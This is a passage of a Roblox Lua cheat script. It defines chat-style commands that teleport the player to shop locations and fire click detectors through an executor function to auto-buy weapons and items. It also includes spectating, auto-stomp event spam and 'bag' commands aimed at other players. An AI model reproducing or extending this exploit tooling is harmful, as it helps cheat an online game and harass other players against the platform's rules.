			fireclickdetector(game.Workspace.Ignored.Shop['[Shovel] - $320'].ClickDetector)
			fireclickdetector(game.Workspace.Ignored.Shop['[Shovel] - $320'].ClickDetector)
			wait()
			game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(_G.savedhumanoidpos)
		end;
	});

	addCommand({
		["Name"] = "barrelammo";
		["Function"] = function()
			_G.savedhumanoidpos = game.Players.LocalPlayer.Character.HumanoidRootPart.Position
			pcall(function()
				for i, v in pairs(game.Players.LocalPlayer.Backpack:GetChildren()) do
					if v.Name == '18 [Double-Barrel SG Ammo] - $60' then
						v.Parent = game.Players.LocalPlayer.Character
					end
				end
			end)
			wait(.9)
			local targetpos = CFrame.new(-1046.20032, 18.8513641, -256.449951, -1, 0, 0, 0, 1, 0, 0, 0, -1)
			local plr = game.Players.LocalPlayer
			local pos = plr.Character.HumanoidRootPart.Position
			if not game.Players.LocalPlayer.Character:FindFirstChild("18 [Double-Barrel SG Ammo] - $60") then
				plr.Character.HumanoidRootPart.CFrame = targetpos
				local cd = game:GetService("Workspace").Ignored.Shop["18 [Double-Barrel SG Ammo] - $60"]:FindFirstChild("ClickDetector")
				wait(.9)
				fireclickdetector(cd)
				wait(.9)
				fireclickdetector(cd)
				wait(.4)
			end
			game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(_G.savedhumanoidpos)
		end;
	});



	addCommand({
		["Name"] = "firefighter";
		["Function"] = function()
			game:GetService('Players').LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(-132.674, 21.280, -145.176)
		end;
	});

	addCommand({
		["Name"] = "furniture";
		["Function"] = function()
			game:GetService('Players').LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(-491.367, 21.253, -131.165)
		end;
	});

	addCommand({
		["Name"] = "park";
		["Function"] = function()
			game:GetService('Players').LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(360.966, 48.5, -522.987)
		end;
	});

	addCommand({
		["Name"] = "casino";
		["Function"] = function()
			game:GetService('Players').LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(-879.277, 21.254, -190.199)
		end;
	});

	addCommand({
		["Name"] = "dacasino";
		["Function"] = function()
			game:GetService('Players').LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(-879.277, 21.254, -190.199)
		end;
	});

	addCommand({
		["Name"] = "theatre";
		["Function"] = function()
			game:GetService('Players').LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(-1004.420, 21.254, -180.739)
		end;
	});

	addCommand({
		["Name"] = "basketball"; -- Basketball Pitch / Court
		["Function"] = function()
			game:GetService('Players').LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(-908.901, 21.999, -500.778)
		end;
	});

	addCommand({
		["Name"] = "skateboard"; -- Skateboard Pitch / Court
		["Function"] = function()
			game:GetService('Players').LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(-825.686, 21.999, -549.293)
		end;
	});

	addCommand({
		["Name"] = "gas";
		["Function"] = function()
			game:GetService('Players').LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(595.377, 49.000, -264.222)
		end;
	});

	addCommand({
		["Name"] = "food1";
		["Function"] = function()
			game:GetService('Players').LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(-333.492065, 23.6826477, -292.959625)
		end;
	});

	addCommand({
		["Name"] = "food2";
		["Function"] = function()
			game:GetService('Players').LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(301.780121, 49.2826538, -619.999634)
		end;
	});

	addCommand({
		["Name"] = "police";
		["Function"] = function()
			game:GetService('Players').LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(-267.637, 21.807, -121.982)
		end;
	});

	addCommand({
		["Name"] = "policestation";
		["Function"] = function()
			game:GetService('Players').LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(-267.637, 21.807, -121.982)
		end;
	});

	addCommand({
		["Name"] = "atm1";
		["Function"] = function()
			game:GetService('Players').LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(-446.88, 26.461, -334.28)
		end;
	});

	addCommand({
		["Name"] = "atm2";
		["Function"] = function()
			game:GetService('Players').LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(513.665, 49.726, -302.84)
		end;
	});

	addCommand({
		["Name"] = "atm3";
		["Function"] = function()
			game:GetService('Players').LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(-219.144, 23.633, -792.33)
		end;
	});

	addCommand({
		["Name"] = "atm4";
		["Function"] = function()
			game:GetService('Players').LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(-398.515, 23.353, -586.1)
		end;
	});

	addCommand({
		["Name"] = "atm5";
		["Function"] = function()
			game:GetService('Players').LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(-3.48, 21.638, -99.1)
		end;
	});

	addCommand({
		["Name"] = "atm6";
		["Function"] = function()
			game:GetService('Players').LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(-254.387, 21.579, -409.413)
		end;
	});

	addCommand({
		["Name"] = "atm7n8";
		["Function"] = function()
			game:GetService('Players').LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(586.25, 51.687, -465.317)
		end;
	});

	addCommand({
		["Name"] = "atm9";
		["Function"] = function()
			game:GetService('Players').LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(584.1, 48.661, -278.35)
		end;
	});

	addCommand({
		["Name"] = "atm10";
		["Function"] = function()
			game:GetService('Players').LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(94.155, 22.961, -525.4)
		end;
	});

	addCommand({
		["Name"] = "atm11";
		["Function"] = function()
			game:GetService('Players').LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(-481.32, 22.794, -74.38)
		end;
	});

	addCommand({
		["Name"] = "testplate";
		["Function"] = function()
			game:GetService('Players').LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(-448.505, 49.5, 447.75)
		end;
	});

	addCommand({
		["Name"] = "safeafk";
		["Function"] = function()
			game:GetService('Players').LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(169.126266, -121.450089, 182.002182)
		end;
	});

	addCommand({
		["Name"] = "chicken";
		["Function"] = function()
			_G.savedhumanoidpos = game.Players.LocalPlayer.Character.HumanoidRootPart.Position
			game:GetService('Players').LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(-793.978027, -39.6492004, -938.048706)
			wait(.5)

			fireclickdetector(game.Workspace.Ignored.Shop['[Chicken] - $7'].ClickDetector)
			fireclickdetector(game.Workspace.Ignored.Shop['[Chicken] - $7'].ClickDetector)
			wait()
			game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(_G.savedhumanoidpos)
		end;
	});

	addCommand({
		["Name"] = "rpg";
		["Function"] = function()
			_G.savedhumanoidpos = game.Players.LocalPlayer.Character.HumanoidRootPart.Position
			game:GetService('Players').LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(113.657372, -26.7500305, -273.998535)
			wait(.5)

			fireclickdetector(game.Workspace.Ignored.Shop['[RPG] - $6000'].ClickDetector)
			fireclickdetector(game.Workspace.Ignored.Shop['[RPG] - $6000'].ClickDetector)
			wait()
			game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(_G.savedhumanoidpos)
		end;
	});

	addCommand({
		["Name"] = "view";
		["Function"] = function(str)
			local target;
			if (str) then
				target = findPlayer(str);
			end;

			if (loopVariables.Spectating == false) then
				loopVariables.Spectating = true
				game:GetService("Workspace"):FindFirstChild("Camera").CameraSubject = game:GetService("Players")[target.Name].Character:FindFirstChildOfClass("Humanoid");
				sendNotif("", "Now Spectating "..target.Name..".", 15);
			else
				loopVariables.Spectating = false;
				game:GetService("Workspace"):FindFirstChild("Camera").CameraSubject = game:GetService("Players").LocalPlayer.Character:FindFirstChildOfClass("Humanoid");
				sendNotif("", "Stopped Spectating "..target.Name..".", 15);
			end;
		end;
	})

	addCommand({
		["Name"] = "spectate";
		["Function"] = function(str)
			local target;
			if (str) then
				target = findPlayer(str);
			end;

			if (loopVariables.Spectating == false) then
				loopVariables.Spectating = true
				game:GetService("Workspace"):FindFirstChild("Camera").CameraSubject = game:GetService("Players")[target.Name].Character:FindFirstChildOfClass("Humanoid");
				sendNotif("", "Now Spectating "..target.Name..".", 15);
			else
				loopVariables.Spectating = false;
				game:GetService("Workspace"):FindFirstChild("Camera").CameraSubject = game:GetService("Players").LocalPlayer.Character:FindFirstChildOfClass("Humanoid");
				sendNotif("", "Stopped Spectating "..target.Name..".", 15);
			end;
		end;
	})

	addCommand({
		["Name"] = "autostomp";
		["Function"] = function(str)
			if (loopVariables.Autostomp == false) then
				loopVariables.Autostomp = true;
				sendNotif("", "Autostomp Enabled.");
			else
				loopVariables.Autostomp = false;
				sendNotif("", "Autostomp Disabled.");
			end;

			while true do
				wait()
				if loopVariables.Autostomp == true then
					game.ReplicatedStorage.MainEvent:FireServer("Stomp")
				end
			end
		end;
	})

	addCommand({
		["Name"] = "grenade";
		["Function"] = function()
			_G.savedhumanoidpos = game.Players.LocalPlayer.Character.HumanoidRootPart.Position
			game:GetService('Players').LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(108.909653, -26.7500305, -273.868164)
			wait(.5)

			fireclickdetector(game.Workspace.Ignored.Shop['[Grenade] - $700'].ClickDetector)
			fireclickdetector(game.Workspace.Ignored.Shop['[Grenade] - $700'].ClickDetector)
			wait()
			game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(_G.savedhumanoidpos)
		end;
	});

	addCommand({
		["Name"] = "flashbang";
		["Function"] = function()
			_G.savedhumanoidpos = game.Players.LocalPlayer.Character.HumanoidRootPart.Position
			game:GetService('Players').LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(104.166924, -26.7500305, -273.964966)
			wait(.5)

			fireclickdetector(game.Workspace.Ignored.Shop['[Flashbang] - $550'].ClickDetector)
			fireclickdetector(game.Workspace.Ignored.Shop['[Flashbang] - $550'].ClickDetector)
			wait()
			game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(_G.savedhumanoidpos)
		end;
	});

	addCommand({
		["Name"] = "aug";
		["Function"] = function()
			_G.savedhumanoidpos = game.Players.LocalPlayer.Character.HumanoidRootPart.Position
			game:GetService('Players').LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(-273.383636, 52.2636375, -215.37851)
			wait(.5)

			fireclickdetector(game.Workspace.Ignored.Shop['[AUG] - $1950'].ClickDetector)
			fireclickdetector(game.Workspace.Ignored.Shop['[AUG] - $1950'].ClickDetector)
			wait()
			game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(_G.savedhumanoidpos)
		end;
	});

	addCommand({
		["Name"] = "mask";
		["Function"] = function()
			_G.savedhumanoidpos = game.Players.LocalPlayer.Character.HumanoidRootPart.Position
			game:GetService('Players').LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(605.025513, 49.0000458, -267.874573)
			wait(.5)

			fireclickdetector(game.Workspace.Ignored.Shop['[Surgeon Mask] - $25'].ClickDetector)
			fireclickdetector(game.Workspace.Ignored.Shop['[Surgeon Mask] - $25'].ClickDetector)
			wait()
			game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(_G.savedhumanoidpos)
		end;
	});

	addCommand({
		["Name"] = "starblox";
		["Function"] = function()
			_G.savedhumanoidpos = game.Players.LocalPlayer.Character.HumanoidRootPart.Position
			game:GetService('Players').LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(603.11676, 49.0000458, -258.258484)
			wait(.5)

			fireclickdetector(game.Workspace.Ignored.Shop['[Starblox Latte] - $5'].ClickDetector)
			fireclickdetector(game.Workspace.Ignored.Shop['[Starblox Latte] - $5'].ClickDetector)
			wait()
			game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(_G.savedhumanoidpos)
		end;
	});

	addCommand({
		["Name"] = "moneygun";
		["Function"] = function()
			_G.savedhumanoidpos = game.Players.LocalPlayer.Character.HumanoidRootPart.Position
			game:GetService('Players').LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(-885.262878, 21.75, -129.671936)
			wait(.5)

			fireclickdetector(game.Workspace.Ignored.Shop['[Money Gun] - $777'].ClickDetector)
			fireclickdetector(game.Workspace.Ignored.Shop['[Money Gun] - $777'].ClickDetector)
			wait()
			game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(_G.savedhumanoidpos)
		end;
	});

	addCommand({
		["Name"] = "popcorn";
		["Function"] = function()
			_G.savedhumanoidpos = game.Players.LocalPlayer.Character.HumanoidRootPart.Position
			game:GetService('Players').LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(-994.783936, 24.6000137, -155.277405)
			wait(.5)

			fireclickdetector(game.Workspace.Ignored.Shop['[Popcorn] - $7'].ClickDetector)
			fireclickdetector(game.Workspace.Ignored.Shop['[Popcorn] - $7'].ClickDetector)
			wait()
			game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(_G.savedhumanoidpos)
		end;
	});

	addCommand({
		["Name"] = "sledgehammer";
		["Function"] = function()
			_G.savedhumanoidpos = game.Players.LocalPlayer.Character.HumanoidRootPart.Position
			game:GetService('Players').LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(-901.614685, 21.75, -296.710327)
			wait(.5)

			fireclickdetector(game.Workspace.Ignored.Shop['[SledgeHammer] - $350'].ClickDetector)
			fireclickdetector(game.Workspace.Ignored.Shop['[SledgeHammer] - $350'].ClickDetector)
			wait()
			game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(_G.savedhumanoidpos)
		end;
	});

	addCommand({
		["Name"] = "barrel";
		["Function"] = function()
			_G.savedhumanoidpos = game.Players.LocalPlayer.Character.HumanoidRootPart.Position
			game:GetService('Players').LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(-1039.53931, 21.75, -258.733154)
			wait(.5)

			fireclickdetector(game.Workspace.Ignored.Shop['[Double-Barrel SG] - $1400'].ClickDetector)
			fireclickdetector(game.Workspace.Ignored.Shop['[Double-Barrel SG] - $1400'].ClickDetector)
			wait()
			game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(_G.savedhumanoidpos)
		end;
	});

	addCommand({
		["Name"] = "pepperspray";
		["Function"] = function()
			_G.savedhumanoidpos = game.Players.LocalPlayer.Character.HumanoidRootPart.Position
			game:GetService('Players').LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(586.215881, 49.0000458, -250.845398)
			wait(.5)

			fireclickdetector(game.Workspace.Ignored.Shop['[PepperSpray] - $75'].ClickDetector)
			fireclickdetector(game.Workspace.Ignored.Shop['[PepperSpray] - $75'].ClickDetector)
			wait()
			game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(_G.savedhumanoidpos)
		end;
	});

	addCommand({
		["Name"] = "skullmask";
		["Function"] = function()
			_G.savedhumanoidpos = game.Players.LocalPlayer.Character.HumanoidRootPart.Position
			game:GetService('Players').LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(589.891174, 49.0000458, -267.351471)
			wait(.5)

			fireclickdetector(game.Workspace.Ignored.Shop['[Skull Mask] - $60'].ClickDetector)
			fireclickdetector(game.Workspace.Ignored.Shop['[Skull Mask] - $60'].ClickDetector)
			wait()
			game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(_G.savedhumanoidpos)
		end;
	});

	addCommand({
		["Name"] = "pumpkinmask";
		["Function"] = function()
			_G.savedhumanoidpos = game.Players.LocalPlayer.Character.HumanoidRootPart.Position
			game:GetService('Players').LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(595.746338, 49.0000458, -267.584595)
			wait(.5)

			fireclickdetector(game.Workspace.Ignored.Shop['[Pumpkin Mask] - $60'].ClickDetector)
			fireclickdetector(game.Workspace.Ignored.Shop['[Pumpkin Mask] - $60'].ClickDetector)
			wait()
			game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(_G.savedhumanoidpos)
		end;
	});

	addCommand({
		["Name"] = "donut";
		["Function"] = function()
			_G.savedhumanoidpos = game.Players.LocalPlayer.Character.HumanoidRootPart.Position
			game:GetService('Players').LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(602.692261, 49.0000458, -252.443069)
			wait(.5)

			fireclickdetector(game.Workspace.Ignored.Shop['[Donut] - $5'].ClickDetector)
			fireclickdetector(game.Workspace.Ignored.Shop['[Donut] - $5'].ClickDetector)
			wait()
			game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(_G.savedhumanoidpos)
		end;
	});

	addCommand({
		["Name"] = "pitchfork";
		["Function"] = function()
			_G.savedhumanoidpos = game.Players.LocalPlayer.Character.HumanoidRootPart.Position
			game:GetService('Players').LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(249.949081, 21.7499981, -29.1379757)
			wait(.5)

			fireclickdetector(game.Workspace.Ignored.Shop['[Pitchfork] - $320'].ClickDetector)
			fireclickdetector(game.Workspace.Ignored.Shop['[Pitchfork] - $320'].ClickDetector)
			wait()
			game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(_G.savedhumanoidpos)
		end;
	});

	addCommand({
		["Name"] = "flame";
		["Function"] = function()
			_G.savedhumanoidpos = game.Players.LocalPlayer.Character.HumanoidRootPart.Position
			game:GetService('Players').LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(-157.208282, 53.8106155, -102.88887)
			wait(.5)

			fireclickdetector(game.Workspace.Ignored.Shop['[Flamethrower] - $7500'].ClickDetector)
			fireclickdetector(game.Workspace.Ignored.Shop['[Flamethrower] - $7500'].ClickDetector)
			wait()
			game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(_G.savedhumanoidpos)
		end;
	});

	addCommand({
		["Name"] = "paintballmask";
		["Function"] = function()
			_G.savedhumanoidpos = game.Players.LocalPlayer.Character.HumanoidRootPart.Position
			game:GetService('Players').LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(-434.983185, -21.25, 26.9759789)
			wait(.5)

			fireclickdetector(game.Workspace.Ignored.Shop['[Paintball Mask] - $60'].ClickDetector)
			fireclickdetector(game.Workspace.Ignored.Shop['[Paintball Mask] - $60'].ClickDetector)
			wait()
			game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(_G.savedhumanoidpos)
		end;
	});

	addCommand({
		["Name"] = "flashlight";
		["Function"] = function()
			_G.savedhumanoidpos = game.Players.LocalPlayer.Character.HumanoidRootPart.Position
			game:GetService('Players').LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(-244.102844, 21.75, -217.93573)
			wait(.5)

			fireclickdetector(game.Workspace.Ignored.Shop['[Flashlight] - $10'].ClickDetector)
			fireclickdetector(game.Workspace.Ignored.Shop['[Flashlight] - $10'].ClickDetector)
			wait()
			game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(_G.savedhumanoidpos)
		end;
	});

	addCommand({
		["Name"] = "lettuce";
		["Function"] = function()
			_G.savedhumanoidpos = game.Players.LocalPlayer.Character.HumanoidRootPart.Position
			game:GetService('Players').LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(-86.3614426, 22.7002907, -632.813904)
			wait(.5)

			fireclickdetector(game.Workspace.Ignored.Shop['[Lettuce] - $5'].ClickDetector)
			fireclickdetector(game.Workspace.Ignored.Shop['[Lettuce] - $5'].ClickDetector)
			wait()
			game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(_G.savedhumanoidpos)
		end;
	});

	addCommand({
		["Name"] = "weights";
		["Function"] = function()
			_G.savedhumanoidpos = game.Players.LocalPlayer.Character.HumanoidRootPart.Position
			game:GetService('Players').LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(-55.7001457, 22.9502697, -654.650208)
			wait(.5)

			fireclickdetector(game.Workspace.Ignored.Shop['[Weights] - $120'].ClickDetector)
			fireclickdetector(game.Workspace.Ignored.Shop['[Weights] - $120'].ClickDetector)
			wait()
			game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(_G.savedhumanoidpos)
		end;
	});

	addCommand({
		["Name"] = "heavyweights";
		["Function"] = function()
			_G.savedhumanoidpos = game.Players.LocalPlayer.Character.HumanoidRootPart.Position
			game:GetService('Players').LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(-46.4928436, 22.9502697, -654.221313)
			wait(.5)

			fireclickdetector(game.Workspace.Ignored.Shop['[HeavyWeights] - $250'].ClickDetector)
			fireclickdetector(game.Workspace.Ignored.Shop['[HeavyWeights] - $250'].ClickDetector)
			wait()
			game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(_G.savedhumanoidpos)
		end;
	});

	addCommand({
		["Name"] = "antibodies";
		["Function"] = function()
			_G.savedhumanoidpos = game.Players.LocalPlayer.Character.HumanoidRootPart.Position
			game:GetService('Players').LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(108.240707, 22.7999954, -470.864594)
			wait(.5)

			fireclickdetector(game.Workspace.Ignored.Shop['[AntiBodies] - $100'].ClickDetector)
			fireclickdetector(game.Workspace.Ignored.Shop['[AntiBodies] - $100'].ClickDetector)
			wait()
			game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(_G.savedhumanoidpos)
		end;
	});

	addCommand({
		["Name"] = "glock";
		["Function"] = function()
			_G.savedhumanoidpos = game.Players.LocalPlayer.Character.HumanoidRootPart.Position
			game:GetService('Players').LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(-271.791931, 21.7999573, -81.2004471)
			wait(.5)

			fireclickdetector(game.Workspace.Ignored.Shop['[Glock] - $300'].ClickDetector)
			fireclickdetector(game.Workspace.Ignored.Shop['[Glock] - $300'].ClickDetector)
			wait()
			game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(_G.savedhumanoidpos)
		end;
	});

	addCommand({
		["Name"] = "armor";
		["Function"] = function()
			_G.savedhumanoidpos = game.Players.LocalPlayer.Character.HumanoidRootPart.Position
			game:GetService('Players').LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(-606.316345, 10.3496914, -788.285034)
			wait(.5)

			fireclickdetector(game.Workspace.Ignored.Shop['[Medium Armor] - $1000'].ClickDetector)
			fireclickdetector(game.Workspace.Ignored.Shop['[Medium Armor] - $1000'].ClickDetector)
			wait()
			game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(_G.savedhumanoidpos)
		end;
	});

	addCommand({
		["Name"] = "pizza";
		["Function"] = function()
			_G.savedhumanoidpos = game.Players.LocalPlayer.Character.HumanoidRootPart.Position
			game:GetService('Players').LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(-788.796631, -39.6492004, -941.028137)
			wait(.5)

			fireclickdetector(game.Workspace.Ignored.Shop['[Pizza] - $5'].ClickDetector)
			fireclickdetector(game.Workspace.Ignored.Shop['[Pizza] - $5'].ClickDetector)
			wait()
			game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(_G.savedhumanoidpos)
		end;
	});

	addCommand({
		["Name"] = "cranberry";
		["Function"] = function()
			_G.savedhumanoidpos = game.Players.LocalPlayer.Character.HumanoidRootPart.Position
			pcall(function()
				for i, v in pairs(game.Players.LocalPlayer.Backpack:GetChildren()) do
					if v.Name == '[Cranberry] - $3' then
						v.Parent = game.Players.LocalPlayer.Character
					end
				end
			end)
			wait(.9)
			local targetpos = CFrame.new(-203.969772, 18.9058037, -827.569702, 5.96046448e-08, 0.000427272142, 0.999999881, 0.000305194379, 0.999999881, -0.000427272113, -0.999999881, 0.000305194349, -1.1920929e-07)
			local plr = game.Players.LocalPlayer
			local pos = plr.Character.HumanoidRootPart.Position
			if not game.Players.LocalPlayer.Character:FindFirstChild("[Cranberry] - $3") then
				plr.Character.HumanoidRootPart.CFrame = targetpos
				local cd = game:GetService("Workspace").Ignored.Shop["[Cranberry] - $3"]:FindFirstChild("ClickDetector")
				wait(.9)
				fireclickdetector(cd)
				wait(.9)
				fireclickdetector(cd)
				wait(.4)
			end
			game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(_G.savedhumanoidpos)
		end;
	});

	addCommand({
		["Name"] = "bag";
		["Function"] = function(str)
			local d = game.Players.LocalPlayer.Character.HumanoidRootPart.Position;
			local target = findPlayer(str);
			bag(target.Name);
			wait()
			game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(d)
		end;
	});

	addCommand({
		["Name"] = "key";
		["Function"] = function()
			_G.savedhumanoidpos = game.Players.LocalPlayer.Character.HumanoidRootPart.Position
			game:GetService('Players').LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(-270.309631, 21.75, -241.169052)
			wait(.5)

			fireclickdetector(game.Workspace.Ignored.Shop['[Key] - $125'].ClickDetector)
			fireclickdetector(game.Workspace.Ignored.Shop['[Key] - $125'].ClickDetector)
			wait()
			game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(_G.savedhumanoidpos)
		end;
	});

	addCommand({
		["Name"] = "lockpicker";
		["Function"] = function()
			_G.savedhumanoidpos = game.Players.LocalPlayer.Character.HumanoidRootPart.Position
			game:GetService('Players').LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(-218.206818, 21.755003, -820.848877)
			wait(.5)

			fireclickdetector(game.Workspace.Ignored.Shop['[LockPicker] - $100'].ClickDetector)
			fireclickdetector(game.Workspace.Ignored.Shop['[LockPicker] - $100'].ClickDetector)
			wait()
			game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(_G.savedhumanoidpos)
		end;
	});

	addCommand({
		["Name"] = "lockpick";
		["Function"] = function()
			_G.savedhumanoidpos = game.Players.LocalPlayer.Character.HumanoidRootPart.Position
			game:GetService('Players').LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(-218.206818, 21.755003, -820.848877)
			wait(.5)

			fireclickdetector(game.Workspace.Ignored.Shop['[LockPicker] - $100'].ClickDetector)
			fireclickdetector(game.Workspace.Ignored.Shop['[LockPicker] - $100'].ClickDetector)
			wait()
			game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(_G.savedhumanoidpos)
		end;
	});

	addCommand({
		["Name"] = "knife";
		["Function"] = function()
			_G.savedhumanoidpos = game.Players.LocalPlayer.Character.HumanoidRootPart.Position
			game:GetService('Players').LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(-278.902435, 21.75, -236.284897)
			wait(.5)

			fireclickdetector(game.Workspace.Ignored.Shop['[Knife] - $150'].ClickDetector)
			fireclickdetector(game.Workspace.Ignored.Shop['[Knife] - $150'].ClickDetector)
			wait()
			game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(_G.savedhumanoidpos)
		end;
	});

	addCommand({
		["Name"] = "shotgun";
		["Function"] = function()
			_G.savedhumanoidpos = game.Players.LocalPlayer.Character.HumanoidRootPart.Position
			pcall(function()
				for i, v in pairs(game.Players.LocalPlayer.Backpack:GetChildren()) do
					if v.Name == '[Shotgun] - $1250' then
						v.Parent = game.Players.LocalPlayer.Character
					end
				end
			end)
			wait(.9)
			local targetpos = CFrame.new(-804.820984, -39.6492004, -940.633728)
			local plr = game.Players.LocalPlayer
			local pos = plr.Character.HumanoidRootPart.Position
			if not game.Players.LocalPlayer.Character:FindFirstChild("[Shotgun] - $1250") then
				plr.Character.HumanoidRootPart.CFrame = targetpos
				local cd = game:GetService("Workspace").Ignored.Shop["[Shotgun] - $1250"]:FindFirstChild("ClickDetector")
				wait(.9)
				fireclickdetector(cd)
				wait(.9)
				fireclickdetector(cd)
				wait(.4)
			end
			game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(_G.savedhumanoidpos)
		end;
	});

	addCommand({
		["Name"] = "shotty";
		["Function"] = function()
			_G.savedhumanoidpos = game.Players.LocalPlayer.Character.HumanoidRootPart.Position
			pcall(function()
				for i, v in pairs(game.Players.LocalPlayer.Backpack:GetChildren()) do
					if v.Name == '[Shotgun] - $1250' then
						v.Parent = game.Players.LocalPlayer.Character
					end
				end
			end)
			wait(.9)
			local targetpos = CFrame.new(-804.820984, -39.6492004, -940.633728)
			local plr = game.Players.LocalPlayer
			local pos = plr.Character.HumanoidRootPart.Position
			if not game.Players.LocalPlayer.Character:FindFirstChild("[Shotgun] - $1250") then
				plr.Character.HumanoidRootPart.CFrame = targetpos
				local cd = game:GetService("Workspace").Ignored.Shop["[Shotgun] - $1250"]:FindFirstChild("ClickDetector")
				wait(.9)
				fireclickdetector(cd)
				wait(.9)
				fireclickdetector(cd)
				wait(.4)
			end
			game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(_G.savedhumanoidpos)
		end;
	});

	addCommand({
		["Name"] = "bat";
		["Function"] = function()
			_G.savedhumanoidpos = game.Players.LocalPlayer.Character.HumanoidRootPart.Position
			pcall(function()
				for i, v in pairs(game.Players.LocalPlayer.Backpack:GetChildren()) do
					if v.Name == '[Bat] - $250' then
						v.Parent = game.Players.LocalPlayer.Character
					end
				end
			end)
			wait(.9)
			local targetpos = CFrame.new(380.384979, 45.59935, -282.740021, 0.99999994, -0.000345288077, 0, 0.000345288077, 0.99999994, 0, 0, 0, 1)
			local plr = game.Players.LocalPlayer
			local pos = plr.Character.HumanoidRootPart.Position
			if not game.Players.LocalPlayer.Character:FindFirstChild("[Bat] - $250") then
